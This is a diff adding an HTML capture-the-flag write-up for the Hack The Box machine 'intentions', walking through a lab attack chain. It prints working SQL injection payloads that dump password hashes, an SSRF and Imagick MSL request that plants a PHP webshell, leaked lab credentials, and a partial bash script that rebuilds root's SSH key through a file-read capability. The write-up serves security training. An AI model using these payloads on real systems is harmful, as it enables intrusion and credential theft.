@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>intentions | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">intentions</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The machine exposed an image gallery web application built on Laravel. Initial reconnaissance
+                        revealed a login and registration page; after creating an account and exploring the app, the
+                        favourite genres update feature turned out to be vulnerable to a <strong>second-order SQL
+                        injection</strong>. The injected payload wasn't evaluated at write time but executed when the
+                        feed page retrieved results, allowing full database enumeration including the extraction of
+                        admin password hashes.</p>
+
+                    <p>Cracking those hashes proved unsuccessful, but a hidden <code>admin.js</code> file revealed the
+                        existence of a <strong>v2 API</strong> that accepted the raw bcrypt hash as a login credential
+                        instead of a plaintext password. Logging in as the admin user <code>greg</code> with his
+                        extracted hash granted access to the admin panel, which featured an image editing endpoint
+                        powered by <strong>Imagick</strong>.</p>
+
+                    <p>The image editing endpoint was vulnerable to <strong>SSRF</strong>, and by combining PHP
+                        temporary file uploads (<code>multipart/form-data</code>), the Imagick <strong>MSL scripting
+                        language</strong>, and the <code>vid:</code> glob protocol, it was possible to write a PHP
+                        webshell to a public directory — achieving remote code execution as <code>www-data</code>.</p>
+
+                    <p>From there, a <code>.git</code> directory accidentally left in production contained a commit
+                        with hardcoded credentials for user <code>greg</code>, enabling lateral movement and retrieval
+                        of the user flag. Finally, the <code>scanner</code> binary in <code>/opt</code> held the
+                        <code>cap_dac_read_search</code> capability, allowing it to read any file. By brute-forcing
+                        the MD5 hash of progressively longer prefixes of <code>/root/.ssh/id_rsa</code>, a script
+                        reconstructed the private key character by character, granting SSH access as
+                        <code>root</code>.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e06c75;">STATE</span> <span style="color:#e06c75;">SERVICE</span> <span style="color:#e06c75;">VERSION</span>
+<span style="color:#98c379;">22/tcp</span> open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
+|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
+<span style="color:#98c379;">80/tcp</span> open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Intentions
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Two open ports: SSH on 22 and an nginx web server on port 80. Let's start with the web application.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Navigating to port 80 reveals an image gallery application with a login and registration page:</p>
+
+                <img src="./media/image2.png" alt="Image gallery web application showing the login and registration page" />
+
+                <p>After registering an account and exploring the app, directory fuzzing reveals these routes:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">301</span> /css      → http://10.129.229.27/css/
+<span style="color:#98c379;">302</span> /logout   → http://10.129.229.27
+<span style="color:#98c379;">302</span> /admin    → http://10.129.229.27
+<span style="color:#98c379;">301</span> /fonts    → http://10.129.229.27/fonts/
+<span style="color:#98c379;">302</span> /gallery  → http://10.129.229.27/gallery
+<span style="color:#98c379;">301</span> /js       → http://10.129.229.27/js/
+<span style="color:#98c379;">301</span> /storage  → http://10.129.229.27/storage/</code></pre>
+
+                <p>Browsing through Burp Suite's HTTP history, the current user's profile data looks like this:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"status"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"success"</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"data"</span><span style="color:#abb2bf;">:{</span><span style="color:#98c379;">"id"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">28</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"name"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"asd"</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"email"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"asd@asd.com"</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"admin"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">0</span><span style="color:#abb2bf;">,</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">:</span><span style="color:#d19a66;">"asd"</span><span style="color:#e06c75;">}}</span></code></pre>
+
+                <p>The <code>"admin": 0</code> field is interesting — worth trying to elevate it somehow.</p>
+
+                <h2>Second-Order SQL Injection via Favourite Genres</h2>
+                <p>After further exploration, the most interesting functionality is the ability to update favourite genres:</p>
+
+                <img src="./media/image4.png" alt="Favourite genres update form showing the comma-separated genre input field" />
+
+                <p>Genres are entered as a comma-separated string and sent via POST to <code>/api/v1/gallery/user/genres</code>:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"nature,food"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <p>The gallery has four image categories stored under these paths:</p>
+                <pre><code class="language-plaintext">public/food
+public/animals
+public/architecture
+public/nature</code></pre>
+
+                <p>Setting a genre and then visiting "My Feed" shows the corresponding images — confirming the genres value is used directly in a database query. Entering a trailing single quote (<code>nature'</code>) as a genre and then loading the feed causes a <strong>500 error</strong>, suggesting the injected character breaks a SQL query at read time, not at write time. This is a classic <strong>second-order SQL injection</strong>: the payload is stored safely, but injected unsanitised into a query when the feed is rendered.</p>
+
+                <p>Testing further, this payload confirms the injection and returns all images:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')OR\t1=1--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <p>The closing parenthesis is needed because the backend query is likely structured as:</p>
+
+                <pre><code class="language-sql"><span style="color:#c678dd;">SELECT</span> <span style="color:#abb2bf;">*</span> <span style="color:#c678dd;">FROM</span> gallery
+<span style="color:#c678dd;">WHERE</span> genre <span style="color:#c678dd;">IN</span> (<span style="color:#d19a66;">$input</span>);</code></pre>
+
+                <p>So the payload transforms it into:</p>
+
+                <pre><code class="language-sql"><span style="color:#c678dd;">SELECT</span> <span style="color:#abb2bf;">*</span> <span style="color:#c678dd;">FROM</span> gallery
+<span style="color:#c678dd;">WHERE</span> genre <span style="color:#c678dd;">IN</span> (<span style="color:#d19a66;">'a'</span>) <span style="color:#c678dd;">OR</span> <span style="color:#d19a66;">1</span><span style="color:#abb2bf;">=</span><span style="color:#d19a66;">1</span><span style="color:#abb2bf;">-- -);</span></code></pre>
+
+                <h3>Database Enumeration</h3>
+                <p>Testing a UNION injection to identify the number of columns and find one visible in the HTML output:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,3,4,5--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <img src="./media/image1.png" alt="Feed page showing the UNION SELECT output with column 3 reflected in the HTML" />
+
+                <p>Column 3 is reflected in the output. Now enumerating the database metadata:</p>
+
+                <pre><code class="language-plaintext">version():  10.6.12-MariaDB-0ubuntu0.22.04.1
+database(): intentions</code></pre>
+
+                <p>Extracting table names:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,group_concat(table_name),4,5\tFROM\tinformation_schema.tables\tWHERE\ttable_schema=database()--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-plaintext">gallery_images, personal_access_tokens, migrations, users</code></pre>
+
+                <p>Enumerating columns in the <code>users</code> table:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,group_concat(column_name),4,5\tFROM\tinformation_schema.columns\tWHERE\ttable_schema=database()\tAND\ttable_name='users'--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-plaintext">id, name, email, password, created_at, updated_at, admin, genres</code></pre>
+
+                <p>Dumping admin users:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"genres"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"a')UNION\tSELECT\t1,2,group_concat(id,name,email,password,admin),4,5\tFROM\tusers\tWHERE\tadmin=1--\t-"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-plaintext">1stevesteve@intentions.htb$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa1
+2greggreg@intentions.htb$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m1</code></pre>
+
+                <p>Two admin accounts: <code>steve</code> and <code>greg</code>. Attempting to crack both hashes with hashcat fails — bcrypt with a strong password is not going anywhere quickly. A different angle is needed.</p>
+
+                <h2>Discovering the v2 API via admin.js</h2>
+                <p>Enumerating JavaScript files accessible on the server:</p>
+
+                <pre><code class="language-plaintext">200 GET  http://10.129.229.27/js/login.js
+200 GET  http://10.129.229.27/js/admin.js
+200 GET  http://10.129.229.27/js/app.js
+200 GET  http://10.129.229.27/js/gallery.js</code></pre>
+
+                <p>The <code>admin.js</code> file is accessible even without admin privileges. It's heavily obfuscated, but searching for URL patterns reveals some very interesting endpoints near the end of the file:</p>
+
+                <pre><code class="language-plaintext">/api/v2/admin/image/modify
+/api/v2/admin/users
+/api/v2/gallery/images
+/api/v2/admin/image/{id}</code></pre>
+
+                <p>Also near the end of the file, there's an embedded changelog/notes message that contains several key revelations:</p>
+
+                <blockquote>
+                    <p>"Hey team, I've deployed the v2 API to production and have started using it in the admin section. This will be a major security upgrade for our users, <strong>passwords no longer need to be transmitted to the server in clear text! By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.</strong> The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images [...] feel free to browse all of the available effects for the module: <a href="https://www.php.net/manual/en/class.imagick.php">https://www.php.net/manual/en/class.imagick.php</a>"</p>
+                </blockquote>
+
+                <p>This tells us several things at once: the v2 API accepts the <strong>raw bcrypt hash</strong> as the credential instead of the plaintext password, and the image editing functionality uses <strong>PHP Imagick</strong>. Both are immediately actionable.</p>
+
+                <h3>Accessing the v2 API and Logging in as Admin</h3>
+                <p>Fuzzing confirms the v2 API has its own auth endpoints:</p>
+
+                <pre><code class="language-plaintext">422 POST  /api/v2/auth/login
+422 POST  /api/v2/auth/register
+302 GET   /api/v2/auth/user</code></pre>
+
+                <p>A 422 response means the route is valid but the request body doesn't match expectations. Probing the login endpoint confirms it requires a <code>hash</code> field rather than a <code>password</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#d19a66;">-X POST</span> <span style="color:#98c379;">"http://10.129.229.27/api/v2/auth/login"</span> \
+  <span style="color:#d19a66;">-d</span> <span style="color:#98c379;">'{"email":"greg@intentions.htb"}'</span> \
+  <span style="color:#d19a66;">-H</span> <span style="color:#98c379;">"Content-Type: application/json"</span>
+
+<span style="color:#abb2bf;">{"status":"error","errors":{"hash":["The hash field is required."]}}</span></code></pre>
+
+                <p>Since we already have Greg's bcrypt hash from the SQL injection, we can use it directly as the <code>hash</code> value:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#d19a66;">-X POST</span> <span style="color:#98c379;">"http://10.129.229.27/api/v2/auth/login"</span> \
+  <span style="color:#d19a66;">-d</span> <span style="color:#98c379;">'{"email":"greg@intentions.htb", "hash": "$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m"}'</span> \
+  <span style="color:#d19a66;">-H</span> <span style="color:#98c379;">"Content-Type: application/json"</span> \
+  <span style="color:#d19a66;">-x</span> http://localhost:8080
+
+<span style="color:#abb2bf;">{"status":"success","name":"greg"}</span></code></pre>
+
+                <p>Burp Suite captures the JWT cookie in the response:</p>
+
+                <pre><code class="language-plaintext">Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiO...</code></pre>
+
+                <p>Setting this cookie in the browser grants access to the admin panel. Inside, we can browse all users, all images, and — most importantly — apply image effects via the Imagick-backed endpoint.</p>
+
+                <h2>RCE via SSRF + PHP Temp Files + Imagick MSL</h2>
+                <p>Inside the admin panel, each image has an editing view with four available effects:</p>
+
+                <img src="./media/image3.png" alt="Admin panel image editing view showing four Imagick effects that can be applied to an image" />
+
+                <p>Applying an effect sends this POST request:</p>
+
+                <pre><code class="language-json"><span style="color:#c678dd;">POST</span> /api/v2/admin/image/modify
+
+<span style="color:#e06c75;">{</span>
+  <span style="color:#98c379;">"path"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg"</span><span style="color:#abb2bf;">,</span>
+  <span style="color:#98c379;">"effect"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"wave"</span>
+<span style="color:#e06c75;">}</span></code></pre>
+
+                <p>This also leaks a filesystem path: <code>/var/www/html/intentions/storage/app/public/</code>. Passing a local path like <code>/etc/passwd</code> returns a 422 "bad image path" error, but a URL pointing to our attacker machine works — confirming <strong>SSRF</strong>:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">{</span><span style="color:#98c379;">"path"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"http://10.10.14.172:8000/potato.jpg"</span><span style="color:#abb2bf;">, </span><span style="color:#98c379;">"effect"</span><span style="color:#abb2bf;">: </span><span style="color:#d19a66;">"wave"</span><span style="color:#e06c75;">}</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span> -m http.server 8000
+<span style="color:#abb2bf;"># Serving HTTP on 0.0.0.0 port 8000 ...
+# 10.129.229.27 - - "GET /potato.jpg HTTP/1.1" 200 -</span></code></pre>
+
+                <p>The server fetches the image — SSRF confirmed. Now for the actual exploit.</p>
+
+                <h3>Understanding the Exploit Chain</h3>
+                <p>The technique is documented in detail at <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a>. It abuses three separate mechanisms simultaneously:</p>
+
+                <ol>
+                    <li><strong>PHP temporary files</strong> — when a <code>multipart/form-data</code> request with a file upload is received, PHP saves it to <code>/tmp/phpXXXXXX</code> for the duration of the request.</li>
+                    <li><strong>Imagick MSL (Magick Scripting Language)</strong> — Imagick supports an XML-based scripting format that can instruct it to read content and write it to arbitrary paths.</li>
+                    <li><strong>The <code>vid:</code> glob protocol</strong> — Imagick's <code>vid:</code> protocol can match filenames with wildcards, allowing us to reference the temporary PHP file as <code>vid:msl:/tmp/php*</code> without knowing its exact random name.</li>
+                </ol>
+
+                <p>The backend Imagick code is essentially:</p>
+
+                <pre><code class="language-php"><span style="color:#d19a66;">$path</span>   <span style="color:#abb2bf;">= </span><span style="color:#e06c75;">$_GET</span><span style="color:#abb2bf;">[</span><span style="color:#98c379;">'path'</span><span style="color:#abb2bf;">]; </span><span style="color:#7f848e;">// we control this</span>
+<span style="color:#d19a66;">$effect</span> <span style="color:#abb2bf;">= </span><span style="color:#e06c75;">$_GET</span><span style="color:#abb2bf;">[</span><span style="color:#98c379;">'effect'</span><span style="color:#abb2bf;">];
+</span><span style="color:#d19a66;">$imagick</span> <span style="color:#abb2bf;">= </span><span style="color:#c678dd;">new</span> <span style="color:#e5c07b;">Imagick</span><span style="color:#abb2bf;">(</span><span style="color:#d19a66;">$path</span><span style="color:#abb2bf;">);</span></code></pre>
+
+                <p>We can pass parameters as query strings to free up the body for the multipart upload. This is verified first:</p>
+
+                <pre><code class="language-http"><span style="color:#c678dd;">POST</span> /api/v2/admin/image/modify?path=http://10.10.14.137:8000/test.jpg&amp;effect=charcoal HTTP/1.1</code></pre>
+
+                <p>The Python HTTP server still receives the request, so query parameters work the same as body parameters.</p>
+
+                <h3>Crafting the Exploit Request</h3>
+                <p>The MSL file instructs Imagick to write a PHP webshell to the public storage directory:</p>
+
+                <pre><code class="language-xml"><span style="color:#7f848e;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span style="color:#e06c75;">&lt;image&gt;</span>
+  <span style="color:#98c379;">&lt;read</span> <span style="color:#d19a66;">filename</span><span style="color:#abb2bf;">=</span><span style="color:#e5c07b;">"caption:&lt;?php system($_GET['cmd']); ?&gt;"</span> <span style="color:#98c379;">/&gt;</span>
+  <span style="color:#98c379;">&lt;write</span> <span style="color:#d19a66;">filename</span><span style="color:#abb2bf;">=</span><span style="color:#e5c07b;">"info:/var/www/html/intentions/storage/app/public/pwn.php"</span> <span style="color:#98c379;">/&gt;</span>
+<span style="color:#e06c75;">&lt;/image&gt;</span></code></pre>
+
+                <p>And the full exploit request that delivers it:</p>
+
+                <pre><code class="language-http"><span style="color:#c678dd;">POST</span> /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&amp;effect=charcoal HTTP/1.1
+Host: 10.129.229.27
+Content-Type: multipart/form-data; boundary=------------------------xd
+Cookie: XSRF-TOKEN={token}; token={token}
+
+<span style="color:#abb2bf;">--------------------------xd
+Content-Disposition: form-data; name="file"; filename="test.msl"
+Content-Type: application/octet-stream
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;image&gt;
+  &lt;read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" /&gt;
+  &lt;write filename="info:/var/www/html/intentions/storage/app/public/pwn.php" /&gt;
+&lt;/image&gt;
+--------------------------xd</span></code></pre>
+
+                <p>When this request is processed: PHP saves the uploaded MSL file to <code>/tmp/phpXXXXXX</code>; Imagick is instantiated with <code>vid:msl:/tmp/php*</code>, which globs to that temporary file; Imagick parses the MSL and writes the webshell to the public directory. The server returns a 502, but the file has been created:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">curl</span> <span style="color:#98c379;">"http://10.129.229.27/storage/pwn.php?cmd=id"</span></code></pre>
+
+                <pre><code class="language-plaintext">caption:uid=33(www-data) gid=33(www-data) groups=33(www-data) CAPTION 120x120 120x120+0+0 16-bit sRGB</code></pre>
+
+                <p>Code execution confirmed. Replacing <code>id</code> with a reverse shell payload gives us a shell as <code>www-data</code>.</p>
+
+                <h2>Lateral Movement to greg</h2>
+                <p>Once inside, three users exist in <code>/home</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /home
+<span style="color:#abb2bf;">drwxr-x--- 4 greg   greg   4.0K Jun 19 2023 greg
+drwxr-x--- 4 legal  legal  4.0K Jun 19 2023 legal
+drwxr-x--- 4 steven steven 4.0K Jun 19 2023 steven</span></code></pre>
+
+                <p>The project is a Laravel application. The <code>.env</code> file in the project root contains database credentials:</p>
+
+                <pre><code class="language-ini"><span style="color:#d19a66;">DB_CONNECTION</span><span style="color:#abb2bf;">=mysql
+</span><span style="color:#d19a66;">DB_HOST</span><span style="color:#abb2bf;">=localhost
+</span><span style="color:#d19a66;">DB_PORT</span><span style="color:#abb2bf;">=3306
+</span><span style="color:#d19a66;">DB_DATABASE</span><span style="color:#abb2bf;">=intentions
+</span><span style="color:#d19a66;">DB_USERNAME</span><span style="color:#abb2bf;">=laravel
+</span><span style="color:#d19a66;">DB_PASSWORD</span><span style="color:#abb2bf;">=02mDWOgsOga03G385!!3Plcx</span></code></pre>
+
+                <p>These credentials don't work for any system user. Checking user group memberships:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">id</span> greg
+<span style="color:#abb2bf;">uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)</span>
+
+<span style="color:#61afef;">id</span> steven
+<span style="color:#abb2bf;">uid=1000(steven) gid=1000(steven) groups=1000(steven),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)</span>
+
+<span style="color:#61afef;">id</span> legal
+<span style="color:#abb2bf;">uid=1002(legal) gid=1002(legal) groups=1002(legal),1003(scanner)</span></code></pre>
+
+                <p>There's a <code>scanner</code> group — both <code>greg</code> and <code>legal</code> are members. There's a binary in <code>/opt/scanner</code> accessible to that group, so laterally moving to either of them looks interesting.</p>
+
+                <h3>Credentials in Git History</h3>
+                <p>The project has a <code>.git</code> directory that was accidentally left in production. Running <code>git log</code> directly fails due to ownership checks, but the git objects are just files — so we can archive the entire project and inspect it locally:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">tar</span> czf /tmp/project.tar.gz /var/www/html/intentions/
+<span style="color:#7f848e;"># then transfer via Python HTTP server to attacker machine</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">git</span> log
+
+<span style="color:#abb2bf;">commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
+Author: steve &lt;steve@intentions.htb&gt;
+    Fix webpack for production
+
+commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
+Author: greg &lt;greg@intentions.htb&gt;
+    Test cases did not work on steve's local database, switching to user factory per his advice
+
+commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
+Author: greg &lt;greg@intentions.htb&gt;
+    Adding test cases for the API!
+
+commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
+Author: steve &lt;steve@intentions.htb&gt;
+    Initial v2 commit</span></code></pre>
+
+                <p>Greg's commit about switching database setup looks suspicious. Inspecting it:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">git</span> show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</code></pre>
+
+                <pre><code class="language-diff"><span style="color:#abb2bf;">diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
+--- a/tests/Feature/Helper.php
++++ b/tests/Feature/Helper.php
+@@ -8,12 +8,14 @@ class Helper extends TestCase
+ {
+     public static function getToken($test, $admin = false) {
+         if($admin) {
+<span style="color:#e06c75;">-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);</span>
+<span style="color:#e06c75;">-            return $res->headers->get('Authorization');</span>
+<span style="color:#98c379;">+            $user = User::factory()->admin()->create();</span>
+         }
+         else {
+<span style="color:#e06c75;">-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);</span>
+<span style="color:#e06c75;">-            return $res->headers->get('Authorization');</span>
+<span style="color:#98c379;">+            $user = User::factory()->create();</span></span></code></pre>
+
+                <p>Hardcoded credentials for Greg: <code>Gr3g1sTh3B3stDev3l0per!1998!</code>. Using them to switch to his user:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">su</span> greg
+<span style="color:#7f848e;"># Password: Gr3g1sTh3B3stDev3l0per!1998!</span></code></pre>
+
+                <p>We're now <code>greg</code> and can read the user flag.</p>
+
+                <h2>Privilege Escalation via scanner Binary (cap_dac_read_search)</h2>
+                <p>In <code>/opt/scanner</code> there's a statically-linked Go binary:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ls</span> -lah /opt/scanner
+<span style="color:#abb2bf;">-rwxr-x--- 1 root scanner 1.4M Jun 19 2023 scanner</span>
+
+<span style="color:#61afef;">file</span> scanner
+<span style="color:#abb2bf;">scanner: ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=..., stripped</span></code></pre>
+
+                <p>Running it shows it's a copyright scanner that compares file hashes against a blacklist. Checking its capabilities:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">getcap</span> /opt/scanner/scanner
+<span style="color:#abb2bf;">scanner cap_dac_read_search=ep</span></code></pre>
+
+                <p>The <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code>CAP_DAC_READ_SEARCH</code></a> capability bypasses all file read permission checks and directory read/execute permission checks. In other words, this binary can read <em>any file on the system</em> regardless of ownership or permissions.</p>
+
+                <p>The binary's key flags are:</p>
+                <ul>
+                    <li><code>-c</code> — path to a single file to check</li>
+                    <li><code>-p</code> — print the calculated hash (debug mode)</li>
+                    <li><code>-l</code> — maximum bytes to hash (default 500)</li>
+                    <li><code>-s</code> — specific hash to compare against</li>
+                </ul>
+
+                <p>Setting <code>-l 1</code> hashes only the first byte of the file and prints it. For example:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">./scanner</span> -c /root/.ssh/id_rsa -p -l 1 -s xd
+<span style="color:#abb2bf;">[DEBUG] /root/.ssh/id_rsa has hash 336d5ebc5436534e61d16e63ddfca327</span></code></pre>
+
+                <p>Verifying that the hash corresponds to <code>-</code> (the first character of a standard OpenSSH private key):</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">echo</span> -n <span style="color:#98c379;">"-"</span> | md5sum
+<span style="color:#abb2bf;">336d5ebc5436534e61d16e63ddfca327  -</span></code></pre>
+
+                <p>The hashes match. The attack is clear: by incrementally increasing <code>-l</code> by one byte, comparing the returned hash against the MD5 of <code>(known_prefix + candidate_char)</code>, we can brute-force the file content one character at a time.</p>
+
+                <h3>Brute-Force Script</h3>
+
+                <pre><code class="language-bash"><span style="color:#7f848e;">#!/bin/bash
+# Usage: ./brute_scanner.sh /root/.ssh/id_rsa</span>
+
+<span style="color:#c678dd;">if</span> [ <span style="color:#d19a66;">$#</span> -ne 1 ]; <span style="color:#c678dd;">then</span>
+    <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"Usage: $0 &lt;path_to_file&gt;"</span>
+    <span style="color:#c678dd;">exit</span> 1
+<span style="color:#c678dd;">fi</span>
+
+<span style="color:#d19a66;">FILE_PATH</span>=<span style="color:#98c379;">"$1"</span>
+<span style="color:#d19a66;">CHARSET</span>=<span style="color:#98c379;">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\n -"</span>
+<span style="color:#d19a66;">RESULT</span>=<span style="color:#98c379;">""</span>
+<span style="color:#d19a66;">LENGTH</span>=1
+
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Starting hash brute force for: $FILE_PATH"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Building file character by character..."</span>
+
+<span style="color:#c678dd;">while</span> <span style="color:#c678dd;">true</span>; <span style="color:#c678dd;">do</span>
+    <span style="color:#d19a66;">HASH_OUTPUT</span>=$(<span style="color:#61afef;">./scanner</span> -c <span style="color:#98c379;">"$FILE_PATH"</span> -p -l <span style="color:#98c379;">"$LENGTH"</span> -s xd 2&gt;&amp;1)
+    <span style="color:#d19a66;">TARGET_HASH</span>=$(<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"$HASH_OUTPUT"</span> | <span style="color:#61afef;">grep</span> <span style="color:#98c379;">"has hash"</span> | <span style="color:#61afef;">awk</span> <span style="color:#98c379;">'{print $NF}'</span>)
+
+    <span style="color:#c678dd;">if</span> [ -z <span style="color:#98c379;">"$TARGET_HASH"</span> ]; <span style="color:#c678dd;">then</span>
+        <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[!] No hash returned - likely reached end of file"</span>
+        <span style="color:#c678dd;">break</span>
+    <span style="color:#c678dd;">fi</span>
+
+    <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Length $LENGTH - Target hash: $TARGET_HASH"</span>
+    <span style="color:#d19a66;">FOUND</span>=<span style="color:#d19a66;">false</span>
+
+    <span style="color:#c678dd;">while</span> IFS= <span style="color:#c678dd;">read</span> -r -n1 char; <span style="color:#c678dd;">do</span>
+        [ -z <span style="color:#98c379;">"$char"</span> ] &amp;&amp; char=<span style="color:#d19a66;">$'\n'</span>
+        <span style="color:#d19a66;">TEST_STRING</span>=<span style="color:#98c379;">"${RESULT}${char}"</span>
